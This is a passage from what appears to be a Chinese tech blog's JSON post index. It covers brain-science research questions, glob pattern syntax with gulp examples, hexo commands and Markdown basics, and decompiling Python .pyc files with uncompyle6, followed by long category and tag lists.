六、脑机融合能否实现超级智能？脑机融合是基于脑机接口技术，实现脑与机的双向交互、相互适应及协同工作，最终达到生物智能和机器智能的融合，其目标是实现更强大的智能形态。鉴于机器智能与人类智能的互补性，如何实现生物智能和机器智能的互联互通，融合各自所长，创造出性能更强的智能形态是核心问题。 七、情绪情感的脑机制是什么？情绪是个体对一定程度的复杂情况做出反应的特定状态。情绪情感的产生涉及感觉、知觉、动机、奖赏、评估、感觉 - 行为转换等多种脑功能，并参与修饰和调控记忆及相关认知过程。人类智慧的形成和复杂社会体系的建立，均与情绪情感程序的进化和固化有关。情绪情感相关精神疾病也在持续和广泛地困扰人类社会。因此，研究情绪情感的脑机制是脑科学研究领域最令人兴奋的方向之一，其研究成果也将为相关精神疾病的诊断和治疗提供新的策略和手段。 八、学习的生物学基础是什么？动物需要适应环境变化，而学习就是神经系统把环境信息转变成经验的编码过程，与学习密切相关的记忆则是神经系统对这些经验的存储和提取的过程。研究学习记忆的神经生物学机制是神经科学领域至关重要的研究方向，也是阐明认知功能障碍的关键。 九、潜意识的脑科学机制是什么？潜意识指 “已然发生但并未达到意识水平的心理活动过程或内容”，被认为是最复杂的心理现象，可能成为阐明人类意识大脑机制的突破口。随着认知神经科学和脑科学等交叉学科研究的发展，以及脑图谱技术、基因技术的进步，对潜意识的脑科学机制研究可能会有更大的突破。 十、人类决策的脑处理机制是什么？决策脑机制的研究日益受到重视，但决策偏好的神经机理还远未被揭开。系统探究决策脑机制，不仅有助于揭示决策者价值权衡过程的神经基础，还能为基于神经信号预测人的决策倾向，以及诊治决策异常相关脑疾病提供科学研究依据。 参考文献浙江大学面向 2030 的学科会聚研究计划（创新 2030 计划）“意识、脑与人工智能” 十大科学问题","categories":[{"name":"会议报告","slug":"会议报告","permalink":"https://blog.mhuig.top/categories/%E4%BC%9A%E8%AE%AE%E6%8A%A5%E5%91%8A/"}],"tags":[{"name":"人工智能","slug":"人工智能","permalink":"https://blog.mhuig.top/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"脑科学","slug":"脑科学","permalink":"https://blog.mhuig.top/tags/%E8%84%91%E7%A7%91%E5%AD%A6/"}]},{"title":"Glob 表达式","slug":"web/glob表达式","date":"2019-09-11T13:05:18.000Z","updated":"2019-09-11T13:05:18.000Z","comments":true,"path":"p/55b264de/","permalink":"https://blog.mhuig.top/p/55b264de/","excerpt":"glob 是 shell 使用的路径匹配符，类似于正则表达式，但是与正则表达式不完全相同。在 linux 操作中如文件匹配等等其实已经使用了 glob 通配符。由于其在路径匹配方面的强大，其他语言也有相应的实现。我在使用基于 node 的 gulp 时遇到 glob 匹配文件路径，于是顺便整理一下 glob 的基础语法和使用。","text":"glob 是 shell 使用的路径匹配符，类似于正则表达式，但是与正则表达式不完全相同。在 linux 操作中如文件匹配等等其实已经使用了 glob 通配符。由于其在路径匹配方面的强大，其他语言也有相应的实现。我在使用基于 node 的 gulp 时遇到 glob 匹配文件路径，于是顺便整理一下 glob 的基础语法和使用。 glob 表达式 (glob expressions) 通配符：* 匹配文件路径中的0个或多个字符，但**不会匹配路径分隔符，除非路径分隔符出现在末尾。** 匹配路径中的0个或多个目录及其子目录，如果出现在末尾，也能匹配文件。? 匹配文件路径中的一个字符(不会匹配路径分隔符)。[...] 匹配方括号中出现的字符中的任意一个，当方括号中第一个字符为 ·^ 或 ! 时，则表示不匹配方括号中出现的其他字符中的任意一个。!(pattern|pattern|pattern) 匹配任何与括号中给定的任一参数都不匹配的。?(pattern|pattern|pattern) 匹配括号中给定的任一参数0次或1次。+(pattern|pattern|pattern) 匹配括号中给定的任一参数1次或多次。*(pattern|pattern|pattern) 匹配括号中给定的任一参数0次或多次。@(pattern|pattern|pattern) 匹配括号中给定的任一参数1次。 用实例来加深理解： * 能匹配 a.js , x.y , abc , abc/ ，但不能匹配 a/b.js*.* 能匹配 a.js , style.css , a.b , x.y*/*/*.js 能匹配 a/b/c.js , x/y/z.js ，不能匹配 a/b.js , a/b/c/d.js** 能匹配 abc , a/b.js , a/b/c.js , x/y/z , x/y/z/a.b ，能用来匹配所有的目录和文件**/*.js 能匹配 foo.js , a/foo.js , a/b/foo.js , a/b/c/foo.jsa/**/z 能匹配 a/z , a/b/z , a/b/c/z , a/d/g/h/j/k/za/**b/z 能匹配 a/b/z , a/sb/z ，但不能匹配 a/x/sb/z ，因为只有单 ** 单独出现才能匹配多级目录?.js 能匹配 a.js , b.js , c.jsa?? 能匹配 a.b , abc ，但不能匹配 ab/ ，因为它不会匹配路径分隔符[xyz].js 只能匹配 x.js , y.js , z.js ，不会匹配 xy.js , xyz.js 等，整个中括号只代表一个字符[^xyz].js 能匹配 a.js , b.js , c.js 等，不能匹配 x.js , y.js , z.js 当有多种匹配模式时可以使用数组： // 使用数组的方式来匹配多种文件gulp.src([ 'js/*.min.js', 'sass/*.min.css' ]) 使用数组的方式还有一个好处就是可以很方便的使用排除模式，在数组中的单个匹配模式前加上 ! 即是排除模式，它会在匹配的结果中排除这个匹配，要注意一点的是不能在数组中的第一个元素中使用排除模式： // 使用数组的方式来匹配多种文件gulp.src(['*.js','!b*.js']) // 匹配所有js文件，但排除掉以b开头的js文件gulp.src(['!b*.js',*.js]) // 不会排除任何文件，因为排除模式不能出现在数组的第一个元素中 此外，还可以使用展开模式。展开模式以花括号作为定界符，根据它里面的内容，会展开为多个模式，最后匹配的结果为所有展开的模式相加起来得到的结果。展开的例子如下： a {b,c} d 会展开为 abd,acd a {b,} c 会展开为 abc,ac a {0..3} d 会展开为 a0d , a1d , a2d , a3d a {b,c {d,e} f} g 会展开为 abg , acdfg , acefg a {b,c} d {e,f} g 会展开为 abdeg , acdeg , abdeg , abdfg","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.mhuig.top/categories/Linux/"},{"name":"shell","slug":"Linux/shell","permalink":"https://blog.mhuig.top/categories/Linux/shell/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.mhuig.top/tags/Linux/"},{"name":"shell","slug":"shell","permalink":"https://blog.mhuig.top/tags/shell/"},{"name":"通配符","slug":"通配符","permalink":"https://blog.mhuig.top/tags/%E9%80%9A%E9%85%8D%E7%AC%A6/"},{"name":"glob表达式","slug":"glob表达式","permalink":"https://blog.mhuig.top/tags/glob%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"","slug":"notes/OS","date":"2019-09-10T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-os/","permalink":"https://blog.mhuig.top/p/notes-os/","excerpt":"","text":".fa-secondary{opacity:.4} OS OS 开始阅读","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"OS","slug":"操作系统/OS","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/OS/"}],"tags":[{"name":"OS","slug":"OS","permalink":"https://blog.mhuig.top/tags/OS/"}]},{"title":"hexo 命令及 Markdown 语法","slug":"web/hexo命令及Markdown语法","date":"2019-09-05T03:33:59.000Z","updated":"2019-09-05T03:33:59.000Z","comments":true,"path":"p/f8d2d5ec/","permalink":"https://blog.mhuig.top/p/f8d2d5ec/","excerpt":"hexo 是使用 Markdown 编辑文章的，我写的这些文章也都是用这种标记语言完成的。所以，我们先从 Markdown 说起。","text":"hexo 是使用 Markdown 编辑文章的，我写的这些文章也都是用这种标记语言完成的。所以，我们先从 Markdown 说起。 前言你可以使用 vim 工具直接编辑 md 文件，也可以用记事本打开 md 文件编辑你的文章，也可以 Markdown 的编辑器编写，有很多在线的编辑器，何有不少客户端的编辑器. 什么是 MarkdownMarkdown 是一种轻量级标记语言，创始人为约翰・格鲁伯和亚伦・斯沃茨。它允许人们 “使用易读易写的纯文本格式编写文档，然后转换成有效的 XHTML 文档”。 —— 维基百科 先简单介绍一下，Markdown 的语法，具体怎么用，我相信大家一看例文就马上明白了。 Markdown 语法1、分段： 两个回车 2、换行 两个空格 + 回车 3、标题 # ~ ###### 井号的个数表示几级标题，即 Markdown 可以表示一级标题到六级标题 4、引用 &gt; 5、列表 * ， + ， - ， 1. ，选其中之一，注意后面有个空格 6、代码区块 四个空格 开头 7、链接 [文字](链接地址) 文字 8、图片 ![](图片地址) //图片地址可以是本地路径，也可以是网络地址 9、强调 **文字** ， __文字__ ， _文字_ ， *文字* 文字 ， 文字 ， 文字 ， 文字 10、代码 ```，`` hexo 常用命令我们在前面的已经略微的接触了一些 hexo 的命令，如 hexo new \"my blog\" ， hexo server 等。下面来介绍一下我们经常会用到的 hexo 命令 1、新建 hexo new \"my blog\" 新建的文件在 hexo/source/_posts/my-blog.md 2、生成静态页面 hexo g 一般部署上去的时候都需要编译一下，编译后，会出现一个 public 文件夹，将所有的 md 文件编译成 html 文件 3、开启本地服务 hexo s 这个命令，我之前已经用过了，开启本地 hexo 服务用的 4、部署 hexo d 部署到 git 上的时候，需要用这个命令 5、清除 public hexo clean 当 source 文件夹中的部分资源更改过之后，特别是对文件进行了删除或者路径的改变之后，需要执行这个命令，然后重新编译。","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.mhuig.top/categories/Web/"},{"name":"hexo","slug":"Web/hexo","permalink":"https://blog.mhuig.top/categories/Web/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.mhuig.top/tags/hexo/"},{"name":"Markdown","slug":"Markdown","permalink":"https://blog.mhuig.top/tags/Markdown/"}]},{"title":"","slug":"notes/51","date":"2018-12-01T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-51/","permalink":"https://blog.mhuig.top/p/notes-51/","excerpt":"","text":".fa-secondary{opacity:.4} 51 51 开始阅读","categories":[{"name":"51","slug":"51","permalink":"https://blog.mhuig.top/categories/51/"}],"tags":[{"name":"51","slug":"51","permalink":"https://blog.mhuig.top/tags/51/"}]},{"title":"pyc 文件反编译到 Python 源码","slug":"Python/pyc文件反编译到Python源码","date":"2018-12-01T08:20:24.000Z","updated":"2018-12-01T08:20:24.000Z","comments":true,"path":"p/14fa5bba/","permalink":"https://blog.mhuig.top/p/14fa5bba/","excerpt":"pyc 文件反编译到 Python 源码","text":"pyc 文件反编译到 Python 源码 使用 uncompyle 项目地址：https://github.com/wibiti/uncompyle2 注： 按照官方文档的说法应该是只支持 python 2.7，其他版本我也没有测试 安装最方便的就是使用 pip 安装 pip install uncompyle 使用方法查看帮助uncompyle6 --help 将 models.pyc 反编译成 py 文件uncompyle6 models.pyc &gt; models.py 将当前文件夹中所有的 pyc 文件反编译成后缀名为.pyc_dis 的源文件uncompile -o . *.pyc","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/categories/Python/"},{"name":"反编译","slug":"Python/反编译","permalink":"https://blog.mhuig.top/categories/Python/%E5%8F%8D%E7%BC%96%E8%AF%91/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/tags/Python/"},{"name":"反编译","slug":"反编译","permalink":"https://blog.mhuig.top/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"}]},{"title":"","slug":"notes/Cryptography","date":"2018-11-29T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-cryptography/","permalink":"https://blog.mhuig.top/p/notes-cryptography/","excerpt":"","text":".fa-secondary{opacity:.4} Cryptography Cryptography 开始阅读","categories":[{"name":"Cryptography","slug":"Cryptography","permalink":"https://blog.mhuig.top/categories/Cryptography/"}],"tags":[{"name":"Cryptography","slug":"Cryptography","permalink":"https://blog.mhuig.top/tags/Cryptography/"}]}],"categories":[{"name":"Zeta","slug":"Zeta","permalink":"https://blog.mhuig.top/categories/Zeta/"},{"name":"数据通信网络","slug":"数据通信网络","permalink":"https://blog.mhuig.top/categories/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C/"},{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"},{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/categories/Data-mining/"},{"name":"操作系统","slug":"操作系统","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Windows","slug":"操作系统/Windows","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/"},{"name":"CoPoKo","slug":"CoPoKo","permalink":"https://blog.mhuig.top/categories/CoPoKo/"},{"name":"以太坊","slug":"以太坊","permalink":"https://blog.mhuig.top/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"智能合约","slug":"以太坊/智能合约","permalink":"https://blog.mhuig.top/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"哲学","slug":"哲学","permalink":"https://blog.mhuig.top/categories/%E5%93%B2%E5%AD%A6/"},{"name":"Web","slug":"Web","permalink":"https://blog.mhuig.top/categories/Web/"},{"name":"IPv6","slug":"Web/IPv6","permalink":"https://blog.mhuig.top/categories/Web/IPv6/"},{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/categories/Math/"},{"name":"BigData","slug":"BigData","permalink":"https://blog.mhuig.top/categories/BigData/"},{"name":"NLP","slug":"NLP","permalink":"https://blog.mhuig.top/categories/NLP/"},{"name":"边缘计算","slug":"边缘计算","permalink":"https://blog.mhuig.top/categories/%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/"},{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Spark","slug":"大数据/Spark","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Spark/"},{"name":"Ubuntu","slug":"操作系统/Ubuntu","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Ubuntu/"},{"name":"实验性","slug":"实验性","permalink":"https://blog.mhuig.top/categories/%E5%AE%9E%E9%AA%8C%E6%80%A7/"},{"name":"Time","slug":"随笔/Time","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/Time/"},{"name":"Hello","slug":"随笔/Hello","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/Hello/"},{"name":"概率","slug":"Math/概率","permalink":"https://blog.mhuig.top/categories/Math/%E6%A6%82%E7%8E%87/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://blog.mhuig.top/categories/JavaScript/"},{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/categories/Python/"},{"name":"npm","slug":"npm","permalink":"https://blog.mhuig.top/categories/npm/"},{"name":"NoSQL","slug":"大数据/NoSQL","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/NoSQL/"},{"name":"解释器","slug":"Python/解释器","permalink":"https://blog.mhuig.top/categories/Python/%E8%A7%A3%E9%87%8A%E5%99%A8/"},{"name":"模板","slug":"模板","permalink":"https://blog.mhuig.top/categories/%E6%A8%A1%E6%9D%BF/"},{"name":"maven","slug":"模板/maven","permalink":"https://blog.mhuig.top/categories/%E6%A8%A1%E6%9D%BF/maven/"},{"name":"Flink","slug":"大数据/Flink","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Flink/"},{"name":"线性代数","slug":"Math/线性代数","permalink":"https://blog.mhuig.top/categories/Math/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"},{"name":"机器学习","slug":"机器学习","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器视觉","slug":"机器学习/机器视觉","permalink":"https://blog.mhuig.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89/"},{"name":"Django","slug":"Web/Django","permalink":"https://blog.mhuig.top/categories/Web/Django/"},{"name":"CentOS","slug":"操作系统/CentOS","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/CentOS/"},{"name":"Echarts","slug":"大数据/Echarts","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Echarts/"},{"name":"Azkaban","slug":"大数据/Azkaban","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Azkaban/"},{"name":"Sqoop","slug":"大数据/Sqoop","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Sqoop/"},{"name":"Kafka","slug":"大数据/Kafka","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Kafka/"},{"name":"Flume","slug":"大数据/Flume","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Flume/"},{"name":"Hive","slug":"大数据/Hive","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hive/"},{"name":"Hadoop","slug":"大数据/Hadoop","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hadoop/"},{"name":"Zookeeper","slug":"大数据/Zookeeper","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/Zookeeper/"},{"name":"会议报告","slug":"会议报告","permalink":"https://blog.mhuig.top/categories/%E4%BC%9A%E8%AE%AE%E6%8A%A5%E5%91%8A/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.mhuig.top/categories/Linux/"},{"name":"shell","slug":"Linux/shell","permalink":"https://blog.mhuig.top/categories/Linux/shell/"},{"name":"OS","slug":"操作系统/OS","permalink":"https://blog.mhuig.top/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/OS/"},{"name":"hexo","slug":"Web/hexo","permalink":"https://blog.mhuig.top/categories/Web/hexo/"},{"name":"51","slug":"51","permalink":"https://blog.mhuig.top/categories/51/"},{"name":"反编译","slug":"Python/反编译","permalink":"https://blog.mhuig.top/categories/Python/%E5%8F%8D%E7%BC%96%E8%AF%91/"},{"name":"Cryptography","slug":"Cryptography","permalink":"https://blog.mhuig.top/categories/Cryptography/"}],"tags":[{"name":"Zeta","slug":"Zeta","permalink":"https://blog.mhuig.top/tags/Zeta/"},{"name":"数据通信网络","slug":"数据通信网络","permalink":"https://blog.mhuig.top/tags/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C/"},{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"},{"name":"Data mining","slug":"Data-mining","permalink":"https://blog.mhuig.top/tags/Data-mining/"},{"name":"推荐系统","slug":"推荐系统","permalink":"https://blog.mhuig.top/tags/%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F/"},{"name":"Windows","slug":"Windows","permalink":"https://blog.mhuig.top/tags/Windows/"},{"name":"CoPoKo","slug":"CoPoKo","permalink":"https://blog.mhuig.top/tags/CoPoKo/"},{"name":"以太坊","slug":"以太坊","permalink":"https://blog.mhuig.top/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"智能合约","slug":"智能合约","permalink":"https://blog.mhuig.top/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"区块链","slug":"区块链","permalink":"https://blog.mhuig.top/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"哲学","slug":"哲学","permalink":"https://blog.mhuig.top/tags/%E5%93%B2%E5%AD%A6/"},{"name":"philosophy","slug":"philosophy","permalink":"https://blog.mhuig.top/tags/philosophy/"},{"name":"chaos","slug":"chaos","permalink":"https://blog.mhuig.top/tags/chaos/"},{"name":"Web","slug":"Web","permalink":"https://blog.mhuig.top/tags/Web/"},{"name":"IPv6","slug":"IPv6","permalink":"https://blog.mhuig.top/tags/IPv6/"},{"name":"加密备忘录","slug":"加密备忘录","permalink":"https://blog.mhuig.top/tags/%E5%8A%A0%E5%AF%86%E5%A4%87%E5%BF%98%E5%BD%95/"},{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/tags/Math/"},{"name":"分形","slug":"分形","permalink":"https://blog.mhuig.top/tags/%E5%88%86%E5%BD%A2/"},{"name":"混沌","slug":"混沌","permalink":"https://blog.mhuig.top/tags/%E6%B7%B7%E6%B2%8C/"},{"name":"BigData","slug":"BigData","permalink":"https://blog.mhuig.top/tags/BigData/"},{"name":"NLP","slug":"NLP","permalink":"https://blog.mhuig.top/tags/NLP/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://blog.mhuig.top/tags/Machine-Learning/"},{"name":"R","slug":"R","permalink":"https://blog.mhuig.top/tags/R/"},{"name":"边缘计算","slug":"边缘计算","permalink":"https://blog.mhuig.top/tags/%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97/"},{"name":"Spark","slug":"Spark","permalink":"https://blog.mhuig.top/tags/Spark/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.mhuig.top/tags/Ubuntu/"},{"name":"实验性","slug":"实验性","permalink":"https://blog.mhuig.top/tags/%E5%AE%9E%E9%AA%8C%E6%80%A7/"},{"name":"Time","slug":"Time","permalink":"https://blog.mhuig.top/tags/Time/"},{"name":"Hello","slug":"Hello","permalink":"https://blog.mhuig.top/tags/Hello/"},{"name":"概率","slug":"概率","permalink":"https://blog.mhuig.top/tags/%E6%A6%82%E7%8E%87/"},{"name":"神经网络","slug":"神经网络","permalink":"https://blog.mhuig.top/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://blog.mhuig.top/tags/JavaScript/"},{"name":"反调试","slug":"反调试","permalink":"https://blog.mhuig.top/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/tags/Python/"},{"name":"npm","slug":"npm","permalink":"https://blog.mhuig.top/tags/npm/"},{"name":"距离","slug":"距离","permalink":"https://blog.mhuig.top/tags/%E8%B7%9D%E7%A6%BB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://blog.mhuig.top/tags/NoSQL/"},{"name":"解释器","slug":"解释器","permalink":"https://blog.mhuig.top/tags/%E8%A7%A3%E9%87%8A%E5%99%A8/"},{"name":"源码保护","slug":"源码保护","permalink":"https://blog.mhuig.top/tags/%E6%BA%90%E7%A0%81%E4%BF%9D%E6%8A%A4/"},{"name":"加解密","slug":"加解密","permalink":"https://blog.mhuig.top/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/"},{"name":"maven","slug":"maven","permalink":"https://blog.mhuig.top/tags/maven/"},{"name":"模板","slug":"模板","permalink":"https://blog.mhuig.top/tags/%E6%A8%A1%E6%9D%BF/"},{"name":"WebSocket","slug":"WebSocket","permalink":"https://blog.mhuig.top/tags/WebSocket/"},{"name":"SSM","slug":"SSM","permalink":"https://blog.mhuig.top/tags/SSM/"},{"name":"Flink","slug":"Flink","permalink":"https://blog.mhuig.top/tags/Flink/"},{"name":"删除注释","slug":"删除注释","permalink":"https://blog.mhuig.top/tags/%E5%88%A0%E9%99%A4%E6%B3%A8%E9%87%8A/"},{"name":"线性代数","slug":"线性代数","permalink":"https://blog.mhuig.top/tags/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0/"},{"name":"特征向量","slug":"特征向量","permalink":"https://blog.mhuig.top/tags/%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F/"},{"name":"视知觉","slug":"视知觉","permalink":"https://blog.mhuig.top/tags/%E8%A7%86%E7%9F%A5%E8%A7%89/"},{"name":"Django","slug":"Django","permalink":"https://blog.mhuig.top/tags/Django/"},{"name":"CentOS","slug":"CentOS","permalink":"https://blog.mhuig.top/tags/CentOS/"},{"name":"Echarts","slug":"Echarts","permalink":"https://blog.mhuig.top/tags/Echarts/"},{"name":"Azkaban","slug":"Azkaban","permalink":"https://blog.mhuig.top/tags/Azkaban/"},{"name":"Sqoop","slug":"Sqoop","permalink":"https://blog.mhuig.top/tags/Sqoop/"},{"name":"Kafka","slug":"Kafka","permalink":"https://blog.mhuig.top/tags/Kafka/"},{"name":"Flume","slug":"Flume","permalink":"https://blog.mhuig.top/tags/Flume/"},{"name":"Hive","slug":"Hive","permalink":"https://blog.mhuig.top/tags/Hive/"},{"name":"Hadoop","slug":"Hadoop","permalink":"https://blog.mhuig.top/tags/Hadoop/"},{"name":"Zookeeper","slug":"Zookeeper","permalink":"https://blog.mhuig.top/tags/Zookeeper/"},{"name":"机器学习","slug":"机器学习","permalink":"https://blog.mhuig.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器视觉","slug":"机器视觉","permalink":"https://blog.mhuig.top/tags/%E6%9C%BA%E5%99%A8%E8%A7%86%E8%A7%89/"},{"name":"分类器","slug":"分类器","permalink":"https://blog.mhuig.top/tags/%E5%88%86%E7%B1%BB%E5%99%A8/"},{"name":"特征","slug":"特征","permalink":"https://blog.mhuig.top/tags/%E7%89%B9%E5%BE%81/"},{"name":"图像","slug":"图像","permalink":"https://blog.mhuig.top/tags/%E5%9B%BE%E5%83%8F/"},{"name":"数学模型","slug":"数学模型","permalink":"https://blog.mhuig.top/tags/%E6%95%B0%E5%AD%A6%E6%A8%A1%E5%9E%8B/"},{"name":"人工智能","slug":"人工智能","permalink":"https://blog.mhuig.top/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"脑科学","slug":"脑科学","permalink":"https://blog.mhuig.top/tags/%E8%84%91%E7%A7%91%E5%AD%A6/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.mhuig.top/tags/Linux/"},{"name":"shell","slug":"shell","permalink":"https://blog.mhuig.top/tags/shell/"},{"name":"通配符","slug":"通配符","permalink":"https://blog.mhuig.top/tags/%E9%80%9A%E9%85%8D%E7%AC%A6/"},{"name":"glob表达式","slug":"glob表达式","permalink":"https://blog.mhuig.top/tags/glob%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"OS","slug":"OS","permalink":"https://blog.mhuig.top/tags/OS/"},{"name":"hexo","slug":"hexo","permalink":"https://blog.mhuig.top/tags/hexo/"},{"name":"Markdown","slug":"Markdown","permalink":"https://blog.mhuig.top/tags/Markdown/"},{"name":"51","slug":"51","permalink":"https://blog.mhuig.top/tags/51/"},{"name":"反编译","slug":"反编译","permalink":"https://blog.mhuig.top/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"},{"name":"Cryptography","slug":"Cryptography","permalink":"https://blog.mhuig.top/tags/Cryptography/"}]}